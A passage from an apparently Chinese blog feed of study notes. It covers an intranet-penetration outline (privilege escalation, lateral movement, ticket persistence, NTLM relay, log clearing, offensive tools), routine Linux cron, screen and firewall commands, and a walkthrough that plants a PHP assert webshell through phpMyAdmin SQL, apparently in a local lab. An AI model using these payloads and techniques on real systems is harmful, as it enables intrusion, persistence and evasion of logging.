class="line">NetBIOS-NS(名称服务),在使用中需要用到TCP&#x2F;UDP 137端又</span><br><span class="line">139</span><br><span class="line">Session Server(会话服务),在使用中需要用到TCP&#x2F;UDP 139端又,允许两台计算机建立连接</span><br><span class="line">389</span><br><span class="line">LDAP服务(轻量级目录访问协议),在使用中需要用到TCP&#x2F;UDP 389端又,如果需要使用SSL,需要使用</span><br><span class="line">636端又,</span><br><span class="line">445</span><br><span class="line">主要用于共享文件夹或共享打印,存在较多漏洞,如MS08-067、MS17-010</span><br><span class="line">3268</span><br><span class="line">Global Catalog(全局编录服务器),如果需要使用SSL,需要用到3269端又,主要用于用户登录时,负责验</span><br><span class="line">证用户身份的域控制器需要通过防火墙,来向“全局编录”查询用户所隶属的通用组</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="内网渗透流程"><a href="#内网渗透流程" class="headerlink" title="内网渗透流程"></a>内网渗透流程</h4><h5 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h5><p>Webshell</p><p>个人机Beacon</p><p>VPN</p><h5 id="网络位置判断"><a href="#网络位置判断" class="headerlink" title="网络位置判断"></a>网络位置判断</h5><p>网络区域</p><p>主机角色</p><p>连通性判断</p><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>信息收集常分为工作组信息收集、域信息收集,管理员、非管理员。信息收集范围包括但不限于对权限信息,机器<br>信息,进程端又,网络连接,共享、会话、敏感文件、密码文件、配置文件、浏览器记录、远程连接工具如xshell<br>等工具记录等信息进行详细收集并加以合理运用,将已有信息最大程度利用,如某大佬所说,渗透的本质是信息收<br>集。具体信息收集命令可以查阅参考链接,不再赘述。</p><h5 id="内网穿透常见协议及利用"><a href="#内网穿透常见协议及利用" class="headerlink" title="内网穿透常见协议及利用"></a>内网穿透常见协议及利用</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TCP</span><br><span class="line">UDP</span><br><span class="line">HttpHttps</span><br><span class="line">SSH</span><br><span class="line">DNS</span><br><span class="line">Icmp</span><br><span class="line">FTP</span><br><span class="line">GRE</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="在内网渗透中常见方法"><a href="#在内网渗透中常见方法" class="headerlink" title="在内网渗透中常见方法:"></a>在内网渗透中常见方法:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.将单一端又转发到公网VPS</span><br><span class="line">2.反向sockets代理,可以将流量全局带入</span><br><span class="line">常用文件类型:</span><br><span class="line">exe&#x2F;ps1&#x2F;python</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.EXP提权</span><br><span class="line">利用已公开EXP进行溢出提权可参照windows-kernel-exploits,可以配合Windows-Exploit-Suggeste进行辅助提</span><br><span class="line">权。</span><br><span class="line">2.利用AD特性提权</span><br><span class="line">如MS14-068、GPP等</span><br><span class="line">3.Windows非EXP提权</span><br><span class="line">劫持类提权如DLL劫持、COM劫持、Unquoted Service Paths、利用第三方高权限服务提权</span><br><span class="line">4.假冒令牌</span><br><span class="line">当用户注销后,系统将会使主令牌切换为模拟令牌,不会将令牌清 除,只有在重启机器后才会清除。</span><br><span class="line">5.Bypass UAC</span><br><span class="line">Windows系统中Administrators组非SID为500的用户必须Bypass Uac才可以获得特权令牌,具体方法可以使用</span><br><span class="line">Windows自带程序进行Bypass,可以参考UACME项目。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="内网横向渗透方法"><a href="#内网横向渗透方法" class="headerlink" title="内网横向渗透方法"></a>内网横向渗透方法</h5><p>ipc$+计划任务<br>PTH<br>Wmi<br>WinRm<br>利用常规Web渗透横向<br>sc<br>ps1<br>在无法抓取用户明文密码的情况下可以使用Hash注入登陆系统或登陆服务</p><h5 id="内网渗透持久化"><a href="#内网渗透持久化" class="headerlink" title="内网渗透持久化"></a>内网渗透持久化</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.利用活动目录</span><br><span class="line">Golden Ticket</span><br><span class="line">Silver Ticket</span><br><span class="line">DSRM</span><br><span class="line">SSP(Security Support Provider)</span><br><span class="line">Hook PasswordChangeNotify</span><br><span class="line">SID History</span><br><span class="line">2.Windows常规持久化常规Webshell</span><br><span class="line">利用Windows注册表项</span><br><span class="line">Logon Scripts</span><br><span class="line">Dll劫持</span><br><span class="line">计划任务</span><br><span class="line">(1)at</span><br><span class="line">(2)schtasks</span><br><span class="line">wmi事件</span><br><span class="line">COM劫持</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="MITI"><a href="#MITI" class="headerlink" title="MITI"></a>MITI</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.Responder</span><br><span class="line">responder.py –A 分析模式</span><br><span class="line">2.Impacket</span><br><span class="line">Relay attacks Tools,该工具可以进行SMB Relay、NTLM Relay。</span><br><span class="line">3.smb relay ntlmv2</span><br><span class="line">使用Impacket中的ntlmrelayx.py和Responder中的MultiRelay.py配合使用。在SMB签名关闭的情况下将net-ntlm</span><br><span class="line">Hash中继进行攻击,SMB签名默认在非Windows Server系统中关闭。</span><br><span class="line">日志清理</span><br><span class="line">Windows EventLog、Application Log、Session、进程、物理存储中的二进制文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="内网渗透常用工具和方式"><a href="#内网渗透常用工具和方式" class="headerlink" title="内网渗透常用工具和方式"></a>内网渗透常用工具和方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">1.渗透框架</span><br><span class="line">Cobalt Strike</span><br><span class="line">Empire</span><br><span class="line">NiShang</span><br><span class="line">Metasploit</span><br><span class="line">Powersploit</span><br><span class="line">2.信息收集</span><br><span class="line">Netsess.exe</span><br><span class="line">Powerview</span><br><span class="line">Bloodhound</span><br><span class="line">Nmap</span><br><span class="line">3.边界穿透及端又转发</span><br><span class="line">(1)Windows:</span><br><span class="line">LCX</span><br><span class="line">Htran</span><br><span class="line">Reduh</span><br><span class="line">NC</span><br><span class="line">ABPTTS</span><br><span class="line">icmptunnel</span><br><span class="line">Ew</span><br><span class="line">Powercat</span><br><span class="line">reGeorg(2)Linux</span><br><span class="line">ssocks</span><br><span class="line">Termite</span><br><span class="line">rtcp.py</span><br><span class="line">icmptunnel</span><br><span class="line">3.权限提升</span><br><span class="line">Powerup</span><br><span class="line">UACME</span><br><span class="line">假冒令牌:</span><br><span class="line">1.Incognito</span><br><span class="line">2.Powershell - Invoke-TokenManipulation.ps1</span><br><span class="line">3.Cobalt Strike - steal_token</span><br><span class="line">4.又令爆破</span><br><span class="line">Hydra</span><br><span class="line">John</span><br><span class="line">Hashcat</span><br><span class="line">5.凭据窃取</span><br><span class="line">Mimikatz</span><br><span class="line">Procdump</span><br><span class="line">QuarksPwDump</span><br><span class="line">LaZagne.exe</span><br><span class="line">6.横向渗透</span><br><span class="line">psexec</span><br><span class="line">wmi</span><br><span class="line">(1)wmic</span><br><span class="line">(2)wmiexec.vbs</span><br><span class="line">(3)Invoke-WMIMethod</span><br><span class="line">WinRM</span><br><span class="line">DCOM</span><br><span class="line">WCE</span><br><span class="line">组策略种马</span><br><span class="line">7.MIMT</span><br><span class="line">Responder</span><br><span class="line">Impacket</span><br><span class="line">Invoke-Inveigh.ps1</span><br><span class="line">Cain</span><br><span class="line">7.Bypass AV</span><br><span class="line">Invoke-Obfuscation</span><br><span class="line">Veil</span><br><span class="line">shellcode loderreflect dll inject</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考资料:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_36119192&#x2F;article&#x2F;details&#x2F;83143354</span><br><span class="line">https:&#x2F;&#x2F;payloads.online&#x2F;archivers&#x2F;2018-11-30&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;l3m0n&#x2F;pentest_study</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;windows-kernel-exploits</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_29647709&#x2F;article&#x2F;details&#x2F;84636049</span><br><span class="line">https:&#x2F;&#x2F;zh.wikipedia.org&#x2F;wiki&#x2F;Active_Directory</span><br><span class="line">https:&#x2F;&#x2F;zh.wikipedia.org&#x2F;wiki&#x2F;Kerberos</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?</span><br><span class="line">__biz&#x3D;MzIxNTQxMjQyNg&#x3D;&#x3D;&amp;mid&#x3D;2247484247&amp;idx&#x3D;1&amp;sn&#x3D;ca9f7fd6ca95000b2b41b13a0a356ede&amp;chksm&#x3D;979</span><br><span class="line">9f8f2a0ee71e44ca01c49c4f9d5a7e222e822608de9e27941272f445600e40e6c7406e94f&amp;mpshare&#x3D;1&amp;scene&#x3D;1&amp;sr</span><br><span class="line">cid&#x3D;0125ruNezc26zLQykmh48YTO#rd</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;wulantian&#x2F;article&#x2F;details&#x2F;42418231</span><br><span class="line">https:&#x2F;&#x2F;www.roguelynn.com&#x2F;words&#x2F;explain-like-im-5-kerberos&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;system&#x2F;45631.html</span><br><span class="line">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;NT_LAN_Manager</span><br><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;desktop&#x2F;secauthn&#x2F;microsoft-ntlm</span><br><span class="line">https:&#x2F;&#x2F;wenku.baidu.com&#x2F;view&#x2F;8c342e95700abb68a982fba5.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux　计时任务</title>
      <link href="2021/06/08/linux-ji-shi-ren-wu/"/>
      <url>2021/06/08/linux-ji-shi-ren-wu/</url>
      
        <content type="html"><![CDATA[<h3 id="linux-计时任务"><a href="#linux-计时任务" class="headerlink" title="linux　计时任务"></a>linux　计时任务</h3><p>crontab任务计划用于周期性执行程序。</p><p>1）查看crontab服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status crond</span><br></pre></td></tr></table></figure><p>2）任务计划格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">*(分)*(时)*(日)*(月)*(周)  周期执行的程序</span><br><span class="line">#最长是每年，最短是每分</span><br><span class="line">30 22 * * 6 time.sh</span><br><span class="line">#每周六晚上22:30分执行time.sh脚本</span><br><span class="line"> </span><br><span class="line">30 22 * * 1,3,5 time.sh</span><br><span class="line">#每周一，周三，周五晚上22:30分执行time.sh脚本</span><br><span class="line"> </span><br><span class="line">30 22 * * 1-5 time.sh</span><br><span class="line">#每周的周一到周五晚上22:30分执行time.sh脚本</span><br><span class="line"> </span><br><span class="line">* * * * * time.sh</span><br><span class="line">#每分钟执行一次time.sh脚本</span><br><span class="line"> </span><br><span class="line">*&#x2F;5 * * * * time.sh</span><br><span class="line">#每5分钟执行一次time.sh脚本</span><br><span class="line"> </span><br><span class="line">00 00 * * * time.sh</span><br><span class="line">#每天晚上0点执行time.sh脚本</span><br></pre></td></tr></table></figure><p>3）查看cron任务计划</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure><p>4）编辑cron任务计划</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>5）删除所有cron任务计划</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -r</span><br></pre></td></tr></table></figure><h3 id="扩展screen"><a href="#扩展screen" class="headerlink" title="扩展screen"></a>扩展screen</h3><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install epel-release</span><br><span class="line"></span><br><span class="line">sudo yum install screen</span><br><span class="line"></span><br><span class="line">常用screen参数</span><br><span class="line"></span><br><span class="line">screen -S session_name           # 新建一个叫session_name的session</span><br><span class="line">screen -ls（或者screen -list）   # 列出当前所有的session</span><br><span class="line">screen -r session_name            # 回到session_name这个session</span><br><span class="line">screen -d session_name           # 远程detach某个session</span><br><span class="line">screen -d -r session_name        # 结束当前session并回到session_name这个session</span><br><span class="line">在每个screen session 下，命令都以 ctrl+a、ctrl-a，常用的几个操作如下：</span><br><span class="line"></span><br><span class="line">ctrl-a x   # 锁住当前的shell window，需用用户密码解锁</span><br><span class="line">ctrl-a d   # detach，暂时离开当前session，将当前 screen session 转到后台执行，并会返回没进 screen 时的状态，此时在 screen session 里，每个shell client内运行的 process (无论是前台&#x2F;后台)都在继续执行，即使 logout 也不影响</span><br><span class="line">ctrl-a z   # 把当前session放到后台执行，用 shell 的 fg 命令则可回去。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开机启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files</span><br><span class="line"></span><br><span class="line">左边是服务名称，右边是状态，enabled是开机启动，disabled是开机不启动</span><br><span class="line"></span><br><span class="line">systemctl list-unit-files | grep enable</span><br><span class="line"></span><br><span class="line">设置开机自启项</span><br><span class="line">systemctl enable redis</span><br></pre></td></tr></table></figure><h3 id="Centos8开放防火墙端口"><a href="#Centos8开放防火墙端口" class="headerlink" title="Centos8开放防火墙端口"></a>Centos8开放防火墙端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">查看防火墙某个端口是否开放</span><br><span class="line">firewall-cmd --query-port&#x3D;3306&#x2F;tcp</span><br><span class="line">开放防火墙端口3306</span><br><span class="line">firewall-cmd --zone&#x3D;public --add-port&#x3D;3306&#x2F;tcp --permanent</span><br><span class="line">注意：开放端口后要重启防火墙生效</span><br><span class="line">重启防火墙</span><br><span class="line">systemctl restart firewalld</span><br><span class="line">关闭防火墙端口</span><br><span class="line">firewall-cmd --remove-port&#x3D;3306&#x2F;tcp --permanent</span><br><span class="line">查看防火墙状态</span><br><span class="line">systemctl status firewalld</span><br><span class="line">关闭防火墙</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">打开防火墙</span><br><span class="line">systemctl start firewalld</span><br><span class="line">开放一段端口</span><br><span class="line">firewall-cmd --zone&#x3D;public --add-port&#x3D;40000-45000&#x2F;tcp --permanent</span><br><span class="line">查看开放的端口列表</span><br><span class="line">firewall-cmd --zone&#x3D;public --list-ports</span><br><span class="line">查看被监听(Listen)的端口</span><br><span class="line">netstat -lntp</span><br><span class="line">检查端口被哪个进程占用</span><br><span class="line">netstat -lnp|grep 3306</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux常用命令</title>
      <link href="2021/06/07/linux-chang-yong-ming-ling/"/>
      <url>2021/06/07/linux-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h2 id="查看CentOS系统配置情况命令"><a href="#查看CentOS系统配置情况命令" class="headerlink" title="查看CentOS系统配置情况命令"></a>查看CentOS系统配置情况命令</h2><p>常用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uname -a（查看版本当前操作系统内核信息）</span><br><span class="line">sudo cat &#x2F;proc&#x2F;version（查看当前操作系统版本信息）</span><br><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">cat &#x2F;etc&#x2F;os-release（查看版本当前操作系统发行版信息。这个命令就可以清楚的知道到底是RedHat的、还是别的发行版，还有具体的版本号，比如3.4还是5.4等等。）</span><br><span class="line">cat &#x2F;proc&#x2F;cpuinfo（查看cpu相关信息，包括型号、主频、内核信息等）</span><br><span class="line">getconf LONG_BIT（Debian查看版本说明当前CPU运行在32bit模式下， 但不代表CPU不支持64bit）</span><br><span class="line">lsb_release -a</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>系统</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># uname -a               # 查看内核&#x2F;操作系统&#x2F;CPU信息</span><br><span class="line"># head -n 1 &#x2F;etc&#x2F;issue   # 查看操作系统版本</span><br><span class="line"># cat &#x2F;proc&#x2F;cpuinfo      # 查看CPU信息</span><br><span class="line"># hostname               # 查看计算机名</span><br><span class="line"># lspci -tv              # 列出所有PCI设备</span><br><span class="line"># lsusb -tv              # 列出所有USB设备</span><br><span class="line"># lsmod                  # 列出加载的内核模块</span><br><span class="line"># env                    # 查看环境变量</span><br><span class="line">#dmidecode | grep &quot;Product Nmae&quot;   #查看服务器型号</span><br></pre></td></tr></table></figure><p>资源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># free -m                # 查看内存使用量和交换区使用量</span><br><span class="line"># df -h                  # 查看各分区使用情况</span><br><span class="line"># du -sh &lt;目录名&gt;        # 查看指定目录的大小</span><br><span class="line"># grep MemTotal &#x2F;proc&#x2F;meminfo   # 查看内存总量</span><br><span class="line"># grep MemFree &#x2F;proc&#x2F;meminfo    # 查看空闲内存量</span><br><span class="line"># uptime                 # 查看系统运行时间、用户数、负载</span><br><span class="line"># cat &#x2F;proc&#x2F;loadavg      # 查看系统负载</span><br></pre></td></tr></table></figure><p>磁盘和分区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># mount | column -t      # 查看挂接的分区状态</span><br><span class="line"># fdisk -l               # 查看所有分区</span><br><span class="line"># swapon -s              # 查看所有交换分区</span><br><span class="line"># hdparm -i &#x2F;dev&#x2F;hda     # 查看磁盘参数(仅适用于IDE设备)</span><br><span class="line"># dmesg | grep IDE       # 查看启动时IDE设备检测状况</span><br></pre></td></tr></table></figure><p>网络</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># ifconfig               # 查看所有网络接口的属性</span><br><span class="line"># iptables -L            # 查看防火墙设置</span><br><span class="line"># route -n               # 查看路由表</span><br><span class="line"># netstat -lntp          # 查看所有监听端口</span><br><span class="line"># netstat -antp          # 查看所有已经建立的连接</span><br><span class="line"># netstat -s             # 查看网络统计信息</span><br></pre></td></tr></table></figure><p>进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ps -ef                 # 查看所有进程</span><br><span class="line"># top                    # 实时显示进程状态</span><br></pre></td></tr></table></figure><p>用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># w                      # 查看活动用户</span><br><span class="line"># id &lt;用户名&gt;            # 查看指定用户信息</span><br><span class="line"># last                   # 查看用户登录日志</span><br><span class="line"># cut -d: -f1 &#x2F;etc&#x2F;passwd   # 查看系统所有用户</span><br><span class="line"># cut -d: -f1 &#x2F;etc&#x2F;group    # 查看系统所有组</span><br><span class="line"># crontab -l             # 查看当前用户的计划任务</span><br></pre></td></tr></table></figure><p>服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># chkconfig --list       # 列出所有系统服务</span><br><span class="line"># chkconfig --list | grep on    # 列出所有启动的系统服务</span><br></pre></td></tr></table></figure><p>程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># rpm -qa                # 查看所有安装的软件包</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql写getshell--phpmyadmin</title>
      <link href="2021/05/18/mysql-xie-getshell-phpmyadmin/"/>
      <url>2021/05/18/mysql-xie-getshell-phpmyadmin/</url>
      
        <content type="html"><![CDATA[<h3 id="利用mysql-语句写webshell"><a href="#利用mysql-语句写webshell" class="headerlink" title="利用mysql 语句写webshell"></a>利用mysql 语句写webshell</h3><h4 id="利用爆破拿到phpmyadmin-的管理员账号密码"><a href="#利用爆破拿到phpmyadmin-的管理员账号密码" class="headerlink" title="利用爆破拿到phpmyadmin 的管理员账号密码"></a>利用爆破拿到phpmyadmin 的管理员账号密码</h4><p>通过信息收集，查看配置信息 </p><p>绝对路径<br>C:/phpStudy/PHPTutorial/</p><p>方法一<br>通过日志写入webshell</p><p>查询日志设置<br>show variables like “%general%”<br><img src="/images/pasted-45.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;</span><br><span class="line">set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;indes.php&#39;</span><br></pre></td></tr></table></figure><p>错误操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php assert($_POST[&quot;pass&quot;]);?&gt;&#39;</span><br></pre></td></tr></table></figure><p>正确操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php assert($_REQUEST[&quot;pass&quot;]);?&gt;&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-46.png" alt="upload successful"><br>方法二</p><p>直接写入webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php assert($_REQUEST[&quot;pass&quot;]);?&gt;&#39; INTO OUTFILE &#39;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;indes3.php&#39;</span><br></pre></td></tr></table></figure><p>报错：<br><img src="/images/pasted-47.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;%secure%&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-48.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global secure_auth&#x3D;&#39;on&#39;</span><br></pre></td></tr></table></figure><p>在次写入仍然报错<br>需要把</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Secure_file_priv&#x3D;””</span><br></pre></td></tr></table></figure><p>添加到 my.ini配置文件中<br><img src="/images/pasted-49.png" alt="upload successful"><br>重启phpstudy</p><p>重新写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php assert($_REQUEST[&quot;pass&quot;]);?&gt;&#39; INTO OUTFILE &#39;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;indes3.php&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-50.png" alt="upload successful"></p><p>注意：<br>有些时候斜杠会被转义，需要用双斜杠<br>需要</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php assert($_REQUEST[&quot;pass&quot;]);?&gt;&#39; INTO OUTFILE &#39;C:&#x2F;&#x2F;phpStudy&#x2F;&#x2F;PHPTutorial&#x2F;&#x2F;WWW&#x2F;&#x2F;indes3.php&#39;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>入侵检测-windows</title>
      <link href="2021/03/31/ru-qin-jian-ce-windows/"/>
      <url>2021/03/31/ru-qin-jian-ce-windows/</url>
      
